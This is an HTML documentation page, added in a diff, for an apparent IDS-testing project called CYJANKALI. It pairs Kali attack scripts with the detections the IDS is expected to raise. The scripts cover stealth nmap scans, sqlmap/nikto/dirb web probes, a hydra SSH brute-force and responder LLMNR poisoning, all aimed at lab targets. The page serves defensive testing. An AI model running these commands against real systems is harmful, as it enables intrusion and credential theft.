@@ -1,0 +1,290 @@
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CYJANKALI – Cyjan IDS Offensive Test Framework</title>
+  <meta name="description" content="Strukturierte Kali-Linux-Test-Skripte für das Cyjan IDS – Reconnaissance, Exploits, Brute-Force, Slow-DDoS, MITM. Inklusive der erwarteten Detection-Signaturen.">
+  <meta name="theme-color" content="#0b1220">
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/png" href="assets/CYJAN_x_KALI_Banner.png">
+</head>
+<body>
+
+<header class="hero">
+  <img src="assets/CYJAN_x_KALI_Banner.png" alt="CYJANKALI – Cyjan IDS Offensive Test Framework" class="banner">
+</header>
+
+<nav class="topnav">
+  <a href="#about">Was ist das</a>
+  <a href="#lab">Lab-Setup</a>
+  <a href="#tests">Test-Katalog</a>
+  <a href="#verify">Verifikation</a>
+  <a href="#resources">Ressourcen</a>
+  <a href="#disclaimer">Disclaimer</a>
+</nav>
+
+<main>
+
+<section id="about">
+  <h1>Den Wächter angreifen, den Angreifer erkennen</h1>
+  <p class="lede">
+    <strong>CYJANKALI</strong> ist die offensive Test-Spielwiese für das
+    <a href="https://github.com/JxxKal/ids">Cyjan IDS</a>. Hier sammeln wir
+    Kali-Linux-Skripte, mit denen man das eigene IDS-Setup unter realistischer
+    Last attackiert – und dazu jeweils, was im Frontend zu sehen sein
+    <em>sollte</em>. Wenn die Detection ausbleibt, weißt du wo du nachjustieren
+    musst.
+  </p>
+  <p>
+    Das Wortspiel ist Programm: <strong>Cyankali</strong> (Kaliumcyanid) ist
+    das Gift, gegen das das System schützt. <strong>Kali Linux</strong> ist
+    das Werkzeug, mit dem wir das Gift simulieren.
+  </p>
+</section>
+
+<section id="lab">
+  <h2>Lab-Setup</h2>
+
+  <h3>Topologie</h3>
+  <p>
+    Mindestens zwei VMs in einem isolierten Subnet:
+  </p>
+  <ul class="topology">
+    <li><strong>Cyjan IDS</strong> – installiert aus dem aktuellen ISO, mit Mirror-Interface (z.B. <code>ens19</code>) am Span/Mirror-Port des Lab-Switches.</li>
+    <li><strong>Kali-Angreifer</strong> – Kali Linux, normales Routing-Interface.</li>
+    <li><strong>Ziel-VM</strong> (optional) – damit der Sniffer echten Datenverkehr sieht: ein Web-Server, ein DC, ein DVWA-Container.</li>
+  </ul>
+  <p>
+    Wer keinen physischen Switch mit SPAN-Port hat: in Proxmox/VMware den
+    vSwitch auf <em>Promiscuous</em> stellen und das Mirror-Interface des IDS
+    am gleichen vSwitch hängen lassen wie das Routing-Interface der Ziel-VM.
+    Der Sniffer kapert dann den gesamten Bridge-Traffic.
+  </p>
+
+  <h3>Kali bereitstellen</h3>
+  <p>
+    Frisches Kali-Image holen und in die VM-Plattform deiner Wahl einspielen:
+  </p>
+  <p>
+    <a class="btn-primary" href="https://www.kali.org/get-kali/" rel="noopener">→ kali.org / get-kali</a>
+  </p>
+  <p>
+    <em>Empfehlung:</em> die <strong>Pre-built Virtual Machines</strong>
+    (.ova / .vmx) sparen einen kompletten Installer-Lauf. Default-Login
+    <code>kali / kali</code> sofort ändern.
+  </p>
+</section>
+
+<section id="tests">
+  <h2>Test-Katalog</h2>
+  <p class="lede">
+    Jede Kategorie liefert ein Skript, das du auf der Kali-Box laufen lässt,
+    plus die <em>erwartete</em> Reaktion im Cyjan-Frontend. Wenn der Alert
+    ausbleibt → Anti-Pattern für eine Regel- oder ML-Modell-Verbesserung.
+  </p>
+
+  <article class="test">
+    <h3 id="test-recon">1. Reconnaissance · nmap-Scans</h3>
+    <p>
+      Verschiedene Stealth-Variants gegen die Ziel-VM. Gut um zu prüfen ob
+      Sniffer-Drop-Pct sauber bleibt und ob Connection-Graph die Kali-IP als
+      neuen Knoten markiert.
+    </p>
+<pre><code class="lang-bash">#!/usr/bin/env bash
+TARGET=${1:-192.168.56.10}
+
+echo "[+] SYN-Scan (Top 1000 Ports)"
+sudo nmap -sS -T4 "$TARGET"
+
+echo "[+] FIN-Scan (Stealth)"
+sudo nmap -sF -T3 "$TARGET"
+
+echo "[+] NULL-Scan"
+sudo nmap -sN -T3 "$TARGET"
+
+echo "[+] Xmas-Scan"
+sudo nmap -sX -T3 "$TARGET"
+
+echo "[+] Service- und OS-Detection"
+sudo nmap -sV -O -A "$TARGET"
+</code></pre>
+    <details>
+      <summary>Erwartete IDS-Reaktion</summary>
+      <ul>
+        <li><strong>Signature-Engine</strong>: <code>port-scan-burst</code> &amp; <code>fin-scan-stealth</code> Alerts (Severity <code>medium</code>).</li>
+        <li><strong>ML-Engine</strong>: Anomaly-Score auf der Flow-Aggregat-Ebene steigt; mehrere kurze Flows zur selben Source-IP.</li>
+        <li><strong>Connection-Graph</strong>: Kali-IP wird zum Hub mit vielen ausgehenden Edges.</li>
+      </ul>
+    </details>
+  </article>
+
+  <article class="test">
+    <h3 id="test-web">2. Web-Angriffe · sqlmap, nikto, dirb</h3>
+    <p>
+      Klassische Web-App-Probes gegen DVWA oder eine eigene Test-App. Der
+      Mirror-Port sollte den HTTP-Request-Traffic mitbekommen.
+    </p>
+<pre><code class="lang-bash">#!/usr/bin/env bash
+TARGET=${1:-http://192.168.56.10}
+
+echo "[+] nikto: Misconfig + bekannte CVEs"
+nikto -h "$TARGET" -Tuning 9
+
+echo "[+] dirb: Default-Wordlist Brute-Force"
+dirb "$TARGET" /usr/share/dirb/wordlists/common.txt -r
+
+echo "[+] sqlmap: Injection-Probe gegen DVWA-Login"
+sqlmap -u "$TARGET/login.php" \
+       --data "username=admin&password=admin&Login=Login" \
+       --batch --threads 4 --level 3
+</code></pre>
+    <details>
+      <summary>Erwartete IDS-Reaktion</summary>
+      <ul>
+        <li><strong>Signature-Engine</strong>: <code>sql-inject-tautology</code>, <code>web-bruteforce-paths</code> Alerts (Severity <code>high</code>).</li>
+        <li><strong>Suricata</strong> (falls aktiv): ET-WEB-Server-Rule-Hits.</li>
+        <li><strong>Alert-Manager</strong>: Dedup-Window unterdrückt die nikto-Spam-Wave nach 300 s.</li>
+      </ul>
+    </details>
+  </article>
+
+  <article class="test">
+    <h3 id="test-bruteforce">3. Brute-Force · hydra gegen SSH</h3>
+    <p>
+      Klassisches SSH-Login-Hammern. Tests sowohl die Signature-Engine
+      (Connection-Burst-Pattern) als auch die ML-Anomaly-Detection.
+    </p>
+<pre><code class="lang-bash">#!/usr/bin/env bash
+TARGET=${1:-192.168.56.10}
+
+echo "[+] hydra: SSH brute-force mit Top-100-Wordlist"
+hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      -t 4 -e nsr \
+      ssh://"$TARGET"
+</code></pre>
+    <details>
+      <summary>Erwartete IDS-Reaktion</summary>
+      <ul>
+        <li><strong>Signature-Engine</strong>: <code>ssh-bruteforce</code> Alert nach &gt; 10 Failed-Logins/min (Severity <code>high</code>).</li>
+        <li><strong>ML-Engine</strong>: Flow-Inter-Arrival-Time-Entropie sinkt scharf, Anomaly-Score &gt; 0.8.</li>
+      </ul>
+    </details>
+  </article>
+
+  <article class="test">
+    <h3 id="test-mitm">4. MITM · responder + LLMNR-Poisoning</h3>
+    <p>
+      Klassischer Windows-Lab-Angriff. Der Sniffer sollte den
+      LLMNR/NBT-Broadcast-Traffic erkennen.
+    </p>
+<pre><code class="lang-bash">#!/usr/bin/env bash
+IFACE=${1:-eth0}
+
+sudo responder -I "$IFACE" -wF
+</code></pre>
+    <details>
+      <summary>Erwartete IDS-Reaktion</summary>
+      <ul>
+        <li><strong>Signature-Engine</strong>: <code>llmnr-spoof</code> Alert (Severity <code>critical</code>).</li>
+        <li><strong>Connection-Graph</strong>: Kali-Box antwortet plötzlich auf LLMNR-Queries, die sie nicht erwarten würde.</li>
+      </ul>
+    </details>
+  </article>
+
+  <article class="test placeholder">
+    <h3>Weitere Kategorien (folgen)</h3>
+    <ul>
+      <li>DNS-Tunneling (<code>dnscat2</code>, <code>iodine</code>)</li>
+      <li>Slow-DoS (<code>slowloris</code>, <code>hping3 --rand-source</code>)</li>
+      <li>Metasploit-Module gegen typische Lab-Targets</li>
+      <li>BloodHound + impacket-Suite (Lateral Movement)</li>
+      <li>BurpSuite Active Scan gegen DVWA</li>
+    </ul>
+    <p class="muted">
+      Pull-Requests willkommen – Schema je Test ist <em>Skript / erwartete
+      Detection / Severity</em>.
+    </p>
+  </article>
+</section>
+
+<section id="verify">
+  <h2>Verifikation im IDS-Frontend</h2>
+  <p>
+    Während du die Kali-Skripte fährst, parallel im Cyjan-Frontend
+    (<code>http://&lt;mgmt-ip&gt;/</code>) auf folgende Stellen schauen:
+  </p>
+  <table class="verify-table">
+    <thead>
+      <tr><th>UI-Bereich</th><th>Was du sehen solltest</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Alert-Feed (Live)</td>
+        <td>WebSocket-Push neuer Alerts in Echtzeit, Severity-Spalte korreliert mit Test-Kategorie.</td>
+      </tr>
+      <tr>
+        <td>Connection-Graph</td>
+        <td>Kali-IP als neuer Hub-Knoten; bei nmap erscheint sie mit hoher Out-Degree-Zahl.</td>
+      </tr>
+      <tr>
+        <td>Threat-Level (Header)</td>
+        <td>Der 15-Minuten-Score-Indikator wandert von <span class="dot-green"></span> grün → <span class="dot-yellow"></span> gelb → <span class="dot-orange"></span> orange → <span class="dot-red"></span> rot, je nach Volumen und Severity.</td>
+      </tr>
+      <tr>
+        <td>PCAP-Download</td>
+        <td>Pro Alert ein <code>±60 s</code>-PCAP ladbar (sobald MinIO-Upload durch ist).</td>
+      </tr>
+      <tr>
+        <td>ML-Status</td>
+        <td>Anomaly-Score-Histogramm bekommt einen rechten Tail während der Test-Sessions.</td>
+      </tr>
+    </tbody>
+  </table>
+</section>
+
+<section id="resources">
+  <h2>Ressourcen</h2>
+  <ul class="links">
+    <li><a href="https://github.com/JxxKal/ids" rel="noopener">Cyjan IDS Repository</a> – Source, Issues, Releases</li>
+    <li><a href="https://github.com/JxxKal/ids/releases/latest" rel="noopener">Latest ISO / Update-Paket</a></li>
+    <li><a href="https://www.kali.org/get-kali/" rel="noopener">Kali Linux Download</a></li>
+    <li><a href="https://www.kali.org/tools/" rel="noopener">Kali Tools Reference</a></li>
+    <li><a href="https://attack.mitre.org/" rel="noopener">MITRE ATT&amp;CK Framework</a> – TTP-Mapping</li>
+  </ul>
+</section>
+
+<section id="disclaimer" class="disclaimer">
+  <h2>Disclaimer</h2>
+  <p>
+    Die hier gesammelten Skripte sind für <strong>autorisierte
+    Sicherheitstests im eigenen Lab</strong> gedacht. Der Einsatz gegen
+    fremde Systeme ohne ausdrückliche schriftliche Erlaubnis des Eigentümers
+    ist nach <strong>§ 202c StGB</strong> (Vorbereitung des Ausspähens und
+    Abfangens von Daten), <strong>§ 303a StGB</strong> (Datenveränderung)
+    und <strong>§ 303b StGB</strong> (Computersabotage) strafbar. In den
+    USA gilt <strong>18 U.S.C. § 1030</strong> (CFAA).
+  </p>
+  <p>
+    Wer das CYJANKALI-Material gegen produktive Systeme richtet, tut das auf
+    eigene Verantwortung – die Maintainer von Cyjan IDS übernehmen für
+    daraus resultierende Konsequenzen ausdrücklich keine Haftung.
+  </p>
+</section>
+
+</main>
+
+<footer>
+  <p>
+    <small>
+      CYJANKALI ist Teil des
+      <a href="https://github.com/JxxKal/ids" rel="noopener">Cyjan IDS</a>-Projekts.
+      Pull-Requests sind willkommen unter
+      <code>docs/cyjankali/</code>.
+    </small>
+  </p>
+</footer>
+
+</body>
+</html>
